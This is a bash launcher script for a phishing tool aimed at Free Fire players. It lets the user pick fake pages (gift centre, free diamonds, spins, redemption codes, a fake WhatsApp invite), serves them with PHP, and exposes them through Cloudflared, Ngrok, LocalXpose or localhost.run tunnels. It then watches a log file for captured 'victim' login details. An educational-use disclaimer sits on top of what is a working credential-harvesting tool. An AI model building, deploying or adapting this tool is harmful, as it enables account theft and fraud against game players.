#!/bin/bash

version="1.2.1" 

# chacking update 
check_update() {
    echo -ne "\n[+] Checking for update: "
    release_url='https://raw.githubusercontent.com/CYB3RKING/RDX_CRACK/main/version.txt'
    new_version=$(curl -s "${release_url}")
    if [[ "$new_version" != "$version" ]]; then
        echo -e "Update available: ${new_version}\n"
    else
        echo -e "Up to date\n"
    fi
}
############################################################################################################
# chacking internet
check_status() {
    echo -ne "\n[+] Internet Status: "
    if timeout 3s curl -fIs "https://api.github.com" > /dev/null; then
        echo -e "Online"
        check_update
    else
        echo -e "Offline"
    fi
}
############################################################################################################
mainlogo(){
    echo ""
    echo -e "███████╗██████╗ ███████╗███████╗    ███████╗██╗██████╗ ███████╗ "
    echo -e "██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║██╔══██╗██╔════╝  "
    echo -e "█████╗  ██████╔╝█████╗  █████╗      █████╗  ██║██████╔╝█████╗  "
    echo -e "██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██╔══╝  ██║██╔══██╗██╔══╝  "
    echo -e "██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗"
    echo -e "╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝"
    echo ""
    echo -e "                 [*] https://github.com/CYB3RKING/FreeFire-Phishing "    
    echo -e "                 [*] Credit -> @Online-Hacking "
    echo ""                                                        
}
############################################################################################################
logo(){
    echo ""
    echo -e "███████ ██████  ███████ ███████     ███████ ██ ██████  ███████ "
    echo -e "██      ██   ██ ██      ██          ██      ██ ██   ██ ██      "
    echo -e "█████   ██████  █████   █████       █████   ██ ██████  █████   "
    echo -e "██      ██   ██ ██      ██          ██      ██ ██   ██ ██      "
    echo -e "██      ██   ██ ███████ ███████     ██      ██ ██   ██ ███████  "
    echo -e ""                                                       
}
############################################################################################################
server() {
    echo
    read -n1 -p "[?] Do You Want A Custom Port [Y/N]: " defaultport
    echo

    if [[ ${defaultport} =~ ^([yY])$ ]]; then
        while true; do
            read -n4 -p "[Enter Your Custom 4-digit Port [1024-9999] : " port
            echo ""
            port=${port:-8080}  #  default port 
            if [[ "${port}" =~ ^([1-9][0-9][0-9][0-9])$ && ${port} -ge 1024 ]]; then
                PORT=${port}
                echo -e "[+] Custom Port Set to $port"
                sleep 1
                # echo -e "[+] Starting PHP server : 127.0.0.1$port"
                # php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
                break
            else
                clear
                echo
                echo -ne "\n[!] Invalid 4-digit Port: $port, Try Again...\n"
            fi
        done
    else
        port=${port:-8080}
        echo -ne "\n\n[-] Using Default Port $port\n"
        sleep 1
       # echo -e "[+] Starting PHP server : 127.0.0.1$port"
        #php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
    fi
    sleep 1
}
######################################################################################################3
about() {
    clear
    echo -e "========================================="
    echo -e "           ABOUT THIS TOOL"
    echo -e "========================================="
    echo -e ""
    echo -e "Tool Name: Free Fire Phishing Tool"
    echo -e "Developer: cyb3rking"
    echo -e "Original Tool By: OnlineHacking"
    echo -e ""
    echo -e "Description:"
    echo -e "This tool is designed for phishing purposes related to Free Fire."
    echo -e "It is important to use this tool responsibly and ethically."
    echo -e "Make sure to only use it in legal and authorized scenarios."
    echo -e ""
    echo -e "Disclaimer:"
    echo -e "The developer, cyb3rking, does not endorse or support illegal activities."
    echo -e "This tool is provided for educational purposes only. Misuse of this tool can"
    echo -e "result in severe legal consequences. Always ensure that your activities are"
    echo -e "compliant with local laws and regulations."
    echo -e ""
    echo -e "========================================="
    echo -e "         END OF ABOUT SECTION"
    echo -e "========================================="
    echo -e ""
    echo -e "[1] Back                   [2] Exit"
    read -p "Choice option --> " abt
    if [[ $abt == '1' ]] || [[ $abt == '01' ]]; then
        clear
        choiceopt
    elif [[ $abt == '2' ]] || [[ $abt == '02' ]]; then
        msg_exit
    else
        exit
    fi
}


######################################################################################################3
msg_exit(){
    echo
    logo
    echo -e "Thanks For Yousing this tool "
    echo -e " Joine Channle -> @CYB3R_KING"
}

############################################################################################################
disclaimer(){
    echo ""
	printf "                     \e[91m|===========================|
	            [¤]   \e[1;33mD I S C L A I M E R${red}   \e[91m[¤]
	             \e[91m|===========================|\n\n"
			   echo ""
    echo -e "This tool is for educational purposes only. Unauthorized use for phishing or other malicious activities is illegal and unethical. The creator disclaims all responsibility for misuse. Use this tool responsibly and only in ethical and legal contexts."
    echo
    read -n1 -p 'Accepted This Notice (Y/N): ' option
    if [[ $option == 'Y' ]] || [[ $option == 'y' ]]; then
        clear
    else
        exit
    fi



}
######################################################################################################3
homefile(){
    cd /usr/bin/.FreeFire/
}

############################################################################################################
start_cloudflared() { 
    # Check if cloudflared exists
    if [[ ! -e cloudflared ]]; then
        echo "Cloudflared not found. Installing..."

        # Check if wget is installed
        command -v wget > /dev/null 2>&1 || { echo "I require wget but it's not installed. Install it. Aborting."; exit 1; }

        # Determine architecture and download the appropriate cloudflared binary
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi

        # Make the downloaded file executable
        chmod +x cloudflared
        clear
    fi

    # Start PHP server
    echo "Starting PHP server on port: $port"
    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
    php_pid=$!

    sleep 2

    # Start Cloudflared tunnel
    echo "Starting Cloudflared tunnel: 127.0.0.1:$port"
    ./cloudflared tunnel -url 127.0.0.1:"$port" --logfile cf.log > /dev/null 2>&1 &
    cf_pid=$!

    # Clear old log file and wait for Cloudflared to generate the link
    rm -f cf.log
    sleep 5

    # Capture the first link generated
    clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" | head -n 1)

    # Check if the link was successfully generated
    if [[ -z "$clink" ]]; then
        echo "Error: Cloudflared link not generated."
        kill $cf_pid $php_pid 2>/dev/null
        exit 1
    else
            mainlogo
            echo -e "=======================   SUMAN © 2024 FF  ========================"
            echo -e ""
            echo -e "------------------------- > > > > > > >"
            echo -e "Cloudflared : $clink"
            echo -e "------------------------- > > > > > > >"
            echo -e "LocalHost Link : http://127.0.0.1:$port"
            echo -e "------------------------- > > > > > > >"
            echo -e ""
            echo -e "======================= VICTIM INFORMATION ======================="
            echo -e ""
            echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
            echo -e ""
    fi
}
############################################################################################################
start_loclx() {
    echo -e " "
    rm -rf .loclx
    echo -e ""
    echo "Launching LocalXpose..."
    { sleep 1; localxpose_auth; }
    echo -e "\n"
    echo -e ""

    # Check if LocalXpose exists
    if [[ ! -e loclx ]]; then
        echo "LocalXpose not found. Installing..."

        # Check if wget is installed
        command -v wget > /dev/null 2>&1 || { echo "I require wget but it's not installed. Install it. Aborting."; exit 1; }

        # Download LocalXpose based on architecture
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-arm -O loclx
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-arm64 -O loclx
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-amd64 -O loclx
        else
            wget https://github.com/localxpose/localxpose/releases/latest/download/loclx-linux-386 -O loclx
        fi

        # Make loclx executable
        chmod +x loclx
        clear
    fi

    # Start LocalXpose tunnel
    echo "Starting LocalXpose tunnel: 127.0.0.1:4444"
    if [[ $(command -v termux-chroot) ]]; then
        sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
    else
        sleep 1 && ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
    fi

    sleep 12
    llink=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' .loclx)

    # Check if the link was successfully generated
    if [[ -z "$llink" ]]; then
        echo "Error: LocalXpose link not generated."
        kill $(pgrep loclx) 2>/dev/null
        exit 1
    else
            mainlogo
            echo -e "=======================   SUMAN © 2024 FF  ========================"
            echo -e ""
            echo -e "------------------------- > > > > > > >"
            echo -e "LocalXpose Link : $llink"
            echo -e "------------------------- > > > > > > >"
            echo -e "LocalHost Link : http://127.0.0.1:$port"
            echo -e "------------------------- > > > > > > >"
            echo -e ""
            echo -e "======================= VICTIM INFORMATION ======================="
            echo -e ""
            echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
            echo -e ""
    fi
}


############################################################################################################
start_lhrlife() {
    echo -e " "
    rm -rf lhrlife
    echo -e ""
    echo "Launching lhr.Life SSH..."
    echo -e "\n"
    echo -e ""

    # Check if lhr.Life binary exists
    if [[ ! -e lhrlife ]]; then
        echo "lhr.Life not found. Downloading..."

        # Check if wget is installed
        command -v wget > /dev/null 2>&1 || { echo "I require wget but it's not installed. Install it. Aborting."; exit 1; }

        # Download lhr.Life binary
        wget https://example.com/path/to/lhrlife -O lhrlife  # Replace with actual URL

        # Make lhrlife executable
        chmod +x lhrlife
        clear
    fi

    # Start lhr.Life SSH tunnel
    echo "Starting lhr.Life SSH tunnel: 127.0.0.1:4444"
    sleep 1 && ./lhrlife -R 80:localhost:4444 nokey@localhost.run > lhrlife 2>&1 &

    sleep 12
    lhrlifelink=$(grep -o 'https://[0-9a-zA-Z.]*.lhr.life' lhrlife)

    # Check if the link was successfully generated
    if [[ -z "$lhrlifelink" ]]; then
        echo "Error: lhr.Life link not generated."
        kill $(pgrep lhrlife) 2>/dev/null
        exit 1
    else
            mainlogo
            echo -e "=======================   SUMAN © 2024 FF  ========================"
            echo -e ""
            echo -e "------------------------- > > > > > > >"
            echo -e "lhr.Life Link : $lhrlifelink"
            echo -e "------------------------- > > > > > > >"
            echo -e "LocalHost Link : http://127.0.0.1:$port"
            echo -e "------------------------- > > > > > > >"
            echo -e ""
            echo -e "======================= VICTIM INFORMATION ======================="
            echo -e ""
            echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
            echo -e ""
    fi
}

############################################################################################################
start_localhost(){
        mainlogo
        echo -e "=======================   SUMAN © 2024 FF  ========================"
        echo -e ""
        echo -e "------------------------- > > > > > > >"
        echo -e "LocalHost Link : http://127.0.0.1:$port"
        echo -e "------------------------- > > > > > > >"
        echo -e ""
        echo -e "======================= VICTIM INFORMATION ======================="
        echo -e ""
        echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
        echo -e ""
}

############################################################################################################
start_ngrok() {
    # Check if ngrok exists
    if [[ ! -e ngrok ]]; then
        echo "Ngrok not found. Installing..."

        # Check if wget is installed
        command -v wget > /dev/null 2>&1 || { echo "I require wget but it's not installed. Install it. Aborting."; exit 1; }

        # Download Ngrok based on architecture
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-arm.zip -O ngrok.zip
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-arm64.zip -O ngrok.zip
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-amd64.zip -O ngrok.zip
        else
            wget https://bin.equinox.io/c/4b8e1b06cbb2/ngrok-stable-linux-386.zip -O ngrok.zip
        fi

        # Unzip and make ngrok executable
        unzip ngrok.zip
        chmod +x ngrok
        rm ngrok.zip
        clear
    fi

    # Start PHP server
    echo
    echo "Starting PHP server on port: $port"
    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
    php_pid=$!

    sleep 2

    # Start Ngrok tunnel
    echo "Starting Ngrok tunnel: 127.0.0.1:$port"
    ./ngrok http "$port" > ngrok.log &
    ngrok_pid=$!

    # Clear old log file and wait for Ngrok to generate the link
    sleep 5

    # Capture the first link generated
    nlink=$(grep -o 'https://[-0-9a-z]*\.ngrok.io' "ngrok.log" | head -n 1)

    # Check if the link was successfully generated
    if [[ -z "$nlink" ]]; then
        echo "Error: Ngrok link not generated."
        kill $ngrok_pid $php_pid 2>/dev/null
        exit 1
    else
          mainlogo
          echo -e "=======================   SUMAN © 2024 FF  ========================"
          echo -e ""
          echo -e "------------------------- > > > > > > >"
          echo -e "Ngrok Link : $nlink"
          echo -e "------------------------- > > > > > > >"
          echo -e "LocalHost Link : http://127.0.0.1:$port"
          echo -e "------------------------- > > > > > > >"
          echo -e ""
          echo -e "======================= VICTIM INFORMATION ======================="
          echo -e ""
          echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
          echo -e ""
    fi
}

############################################################################################################
start_all_services() {
    echo -e "Starting all services..."
    start_cloudflared
    start_ngrok
    start_loclx
    start_lhrlife
    clear
    mainlogo
    echo -e "=======================   SUMAN © 2024 FF  ========================"
    echo -e ""
    echo -e "------------------------- > > > > > > >"
    echo -e "Cloudflared : $clink"
    echo -e "------------------------- > > > > > > >"
    echo -e "Ngrok Link : $nlink"
    echo -e "------------------------- > > > > > > >"
    echo -e "LocalXpose Link : $llink"
    echo -e "------------------------- > > > > > > >"
    echo -e "lhr.Life Link : $lhrlifelink"
    echo -e "------------------------- > > > > > > >"
    echo -e "LocalHost Link : http://127.0.0.1:$port"
    echo -e "------------------------- > > > > > > >"
    echo -e ""
    echo -e "======================= VICTIM INFORMATION ======================="
    echo -e ""
    echo -e " [*] Waiting For Login Info, Ctrl + C to Exit..."
    echo -e ""
}


############################################################################################################
select_url() {
    clear
    echo -e "\n"
    echo -e "-------------------------------------------------------------"
    echo -e ""
    echo -e "[01] Cloudflare \t\t\t[Auto Detects]" 
    echo -e ""
    echo -e "[02] Ngrok \t\t\t\t[Account Token Needed]"
    echo -e ""
    echo -e "[03] LocalXpose \t\t\t[NEW! Max 15Min]"
    echo -e ""
    echo -e "[04] lhr.Life \t\t\t\t[NEW! Not Hotspot On]"
    echo -e ""
    echo -e "[05] LocalHost \t\t\t[Only This Devices!]"
    echo -e ""
    echo -e "[06] Ngrok + Cloudflare + LocalXpose + lhr.Life \t[Premium User]"
    echo -e ""
    echo -e "-------------------------------------------------------------"
    echo -e ""

    read -p "Please select an option (1-6): " url_option

    case "$url_option" in
        1)
            echo ""
            start_cloudflared
            ;;
        2)
            echo ""
            start_ngrok
            ;;
        3)
            echo "You selected: LocalXpose (NEW! Max 15Min)"
            start_loclx
            ;;
        4)
            echo "You selected: lhr.Life (NEW! Not Hotspot On)"
            start_lhrlife
            ;;
        5)
            echo "You selected: LocalHost (Only This Devices!)"
            start_localhost
            ;;
        6)
            echo "You selected: Ngrok + Cloudflare + LocalXpose + lhr.Life (Premium User)"
            # Add commands or function calls for combined services here
            ;;
        *)
            echo "Invalid option. Please try again."
            select_url
            ;;
    esac
}

############################################################################################################
logo2() {
    clear
    mainlogo
    echo -e "< < < ====================================================== > > >"
    echo -e ""
    echo -e "[01]  Game Kharido   [Pro]     [06]  Free Fire Skin   [New]"
    echo -e ""
    echo -e "[02]  Garena Gift Center       [07]  Free Fire Spin   [New]"
    echo -e ""
    echo -e "[03]  Magic Event Reward       [08]  Free Coin, Diamond   [New]"
    echo -e ""
    echo -e "[04]  Redemption Code          [09]  Fack WhatsApp Invite"
    echo -e ""
    echo -e "[05]  Diamond Buy              [10]  Choose Gift + Package Gift + Lucky Spin"
    echo -e ""
    echo -e "[99] Exit                      [50] About"
    echo -e ""
    echo -e "< < < ====================================================== > > >"
    echo -e ""
}
############################################################################################################
choiceopt() {
    logo2
    echo -e "┌──(FreeFire-Phishing)-[ Choice a Option ]"
    printf  "└─> " 
    read option

   if [ "$option" = "01" ] || [ "$option" = "1" ]; then
        clear
        homefile
        cd 0/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "02" ] || [ "$option" = "2" ]; then
        cd_home
        cd 2/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        
        break
        
    elif [ "$option" = "03" ] || [ "$option" = "3" ]; then
        # Add commands for option 03 here
        cd_home
        cd 3/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "04" ] || [ "$option" = "4" ]; then
        cd_home
        cd 4/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "05" ] || [ "$option" = "5" ]; then
        cd_home
        cd 6/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "06" ] || [ "$option" = "6" ]; then
        cd_home
        cd 7/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "07" ] || [ "$option" = "7" ]; then
        cd_home
        cd 9/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "08" ] || [ "$option" = "8" ]; then
        cd_home
        cd 8/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "09" ] || [ "$option" = "9" ]; then
        cd_home
        cd 5/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "10" ]; then
        cd_home
        cd 1/
        echo ""
        server
        select_url
        
        if [[ -e OnlineHacking.txt ]]; then
            > OnlineHacking.txt
        fi
        echo ""
        echo ""
        tail -f OnlineHacking.txt
        clear
        msg_exit
        break
        
    elif [ "$option" = "50" ]; then
        # Add commands for option 50 here
        echo "Option 50 selected: About"
        about
        break
        
    elif [ "$option" = "99" ]; then
        echo "Exiting..."
        msg_exit
        exit 0
        
    else
        echo "Invalid option. Please try again."
    fi
}

check_status
disclaimer
choiceopt
